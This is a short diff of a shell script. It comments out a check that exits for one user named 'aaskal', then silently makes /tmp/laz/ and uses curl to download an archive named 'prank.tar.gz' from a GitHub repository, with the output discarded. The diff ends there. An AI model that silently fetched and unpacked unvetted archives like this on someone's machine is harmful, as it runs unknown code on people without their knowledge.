@@ -1,10 +1,10 @@
-if [ $(users) == "aaskal" ]
-then
-    echo "wa ta sir thwa"
-    exit 1
-fi  # replace 'done' with 'fi'
+# if [ $(users) == "aaskal" ]
+# then
+#     echo "wa ta sir thwa"
+#     exit 1
+# fi  # replace 'done' with 'fi'
 
-# rest of the script...
+# # rest of the script...
 mkdir -p /tmp/laz/
 
 curl -s -L https://github.com/ic4rusfly/p1/raw/master/prank.tar.gz -o /tmp/laz/prank.tar.gz > /dev/null
